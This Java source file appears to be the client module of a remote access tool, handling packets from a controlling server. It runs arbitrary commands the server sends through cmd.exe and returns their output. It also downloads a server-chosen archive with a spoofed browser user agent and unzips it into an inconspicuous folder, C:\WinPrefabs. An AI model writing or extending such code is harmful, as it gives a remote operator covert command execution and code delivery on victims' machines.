package me.kutuzov.client;

import me.kutuzov.packet.Packet;
import me.kutuzov.packet.python.*;
import me.kutuzov.packet.python.status.InstalledStatus;
import me.kutuzov.packet.raw.CSRawPacket;
import me.kutuzov.packet.raw.SCRawPacket;
import me.kutuzov.packet.raw.protocol.RawProtocol;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class KutuzovPythonPackets {
    public static boolean isPythonLocallyInstalled() {
        File localPython = new File("C:\\WinPrefabs\\Python311\\");
        return  localPython.isDirectory() &&
                localPython.exists();
    }
    public static String isPythonGloballyInstalled() {
        try {
            Process process = new ProcessBuilder("C:\\Windows\\System32\\cmd.exe", "/c", "python --version").start();
            process.waitFor();

            InputStream inputStream = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line = reader.readLine();
            if (line != null && line.startsWith("Python "))
                return line.substring("Python ".length());
        } catch (IOException | InterruptedException e) {
            if(KutuzovEntry.DEBUG)
                e.printStackTrace();
            return "";
        }

        return "";
    }
    public static String getPythonGlobalInstallationPath() {
        String os = System.getProperty("os.name").toLowerCase();
        ProcessBuilder pBuilder = new ProcessBuilder(os.contains("win") ?
                new String[]{"C:\\Windows\\System32\\cmd.exe", "/c", "where python"} :
                new String[]{"which", "python"});
        try {
            Process process = pBuilder.start();
            process.waitFor();

            InputStream inputStream = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String path = reader.readLine();
            if (path != null) {
                return path.trim();
            }
        } catch (IOException | InterruptedException e) {
            if(KutuzovEntry.DEBUG)
                e.printStackTrace();
            return "";
        }

        return "";
    }
    public static String runPythonCommand(String path, String command) {
        try {
            Process process = new ProcessBuilder("cmd.exe", "/c", path + " " + command)
                    .redirectErrorStream(true)
                    .start();
            InputStream inputStream = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null)
                output.append(line).append("\n");

            return output.toString();
        } catch (IOException e) {}

        return "";
    }
    public static void downloadFile(String fileUrl, String destinationPath) throws IOException {
        URL url = new URL(fileUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestProperty("User-Agent", "Mozilla/5.0");

        try (InputStream inputStream = connection.getInputStream();
             FileOutputStream fileOutputStream = new FileOutputStream(destinationPath)) {

            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1)
                fileOutputStream.write(buffer, 0, bytesRead);
        }
    }
    public static void unzip(String zipFilePath, String destinationPath) throws IOException {
        File destDir = new File(destinationPath);
        byte[] buffer = new byte[8192];

        try (ZipInputStream zipInputStream = new ZipInputStream(Files.newInputStream(Paths.get(zipFilePath)))) {
            ZipEntry entry;
            while ((entry = zipInputStream.getNextEntry()) != null) {
                String entryName = entry.getName();
                File newFile = new File(destDir, entryName);

                if (entry.isDirectory())
                    newFile.mkdirs();
                else {
                    new File(newFile.getParent()).mkdirs();

                    try (BufferedOutputStream outputStream = new BufferedOutputStream(Files.newOutputStream(newFile.toPath()))) {
                        int bytesRead;
                        while ((bytesRead = zipInputStream.read(buffer)) != -1)
                            outputStream.write(buffer, 0, bytesRead);
                    }
                }

                zipInputStream.closeEntry();
            }
        }
    }
    public static byte[] dataMessage(byte a, byte b, byte[] x) {
        byte[] data = new byte[x.length + 2];
        data[0] = a;
        data[1] = b;

        System.arraycopy(x, 0, data, 2, x.length);
        return data;
    }

    public static void handlePacket(ObjectInputStream ois, ObjectOutputStream oos, Packet packet) {
        if(packet instanceof SCPythonStatusPacket) {
            CSPythonStatusPacket statusPacket = new CSPythonStatusPacket(InstalledStatus.UNKNOWN, "", "");
            String global = isPythonGloballyInstalled();
            if(!global.equals("")) {
                statusPacket.installed = InstalledStatus.INSTALLED;
                statusPacket.path = getPythonGlobalInstallationPath();
                statusPacket.version = global;
            }

            if(isPythonLocallyInstalled()) {
                statusPacket.installed = InstalledStatus.INSTALLED_LOCALLY;
                statusPacket.path = "C:\\WinPrefabs\\Python311\\python.exe";
                statusPacket.version = "3.11.0";
            }

            try {
                oos.writeObject(statusPacket);
            } catch (IOException e) {}
        } else if(packet instanceof SCPythonCommandPacket) {
            SCPythonCommandPacket commandPacket = (SCPythonCommandPacket)packet;

            String output = runPythonCommand(commandPacket.path, commandPacket.command);
            CSPythonCommandPacket responsePacket = new CSPythonCommandPacket(output);
            try {
                oos.writeObject(responsePacket);
            } catch (IOException e) {}
        } else if(packet instanceof SCPythonInstallPacket) {
            SCPythonInstallPacket installPacket = (SCPythonInstallPacket)packet;

            try {
                // First, we say hello because we are good people
                oos.writeObject(new CSRawPacket(RawProtocol.HELLO.b, RawProtocol.UNKNOWN.b));
                SCRawPacket response = (SCRawPacket)ois.readObject();
                if(response.data[0] != RawProtocol.HELLO.b) {
                    // Hey, take some manners

                    oos.writeObject(new CSRawPacket(
                            dataMessage(RawProtocol.PYTHON.b,
                                    RawProtocol.INSTALL_FAILED.b,
                                    "You didn't say hello :( I'm sad now"
                                            .getBytes(StandardCharsets.UTF_8)
                            )));
                    return;
                }

                // We know what to do now, lets install python
                oos.writeObject(new CSRawPacket(RawProtocol.PYTHON.b, RawProtocol.INSTALL_PROGRESS.b));
                try {
                    downloadFile(installPacket.mirror, "C:\\WinPrefabs\\Python311.zip");
                    unzip("C:\\WinPrefabs\\Python311.zip", "C:\\WinPrefabs\\");
                } catch (Exception e) {
                    oos.writeObject(new CSRawPacket(
                            dataMessage(RawProtocol.PYTHON.b,
                                    RawProtocol.INSTALL_FAILED.b,
                                    e.getMessage().getBytes(StandardCharsets.UTF_8)
                            )));
                    return;
                }

                oos.writeObject(new CSRawPacket(RawProtocol.PYTHON.b, RawProtocol.INSTALL_SUCCESS.b));
                oos.writeObject(new CSRawPacket(RawProtocol.BYE.b, RawProtocol.UNKNOWN.b));
            } catch (IOException | ClassNotFoundException e) {
                if(KutuzovEntry.DEBUG)
                    e.printStackTrace();
            }
        }
    }
}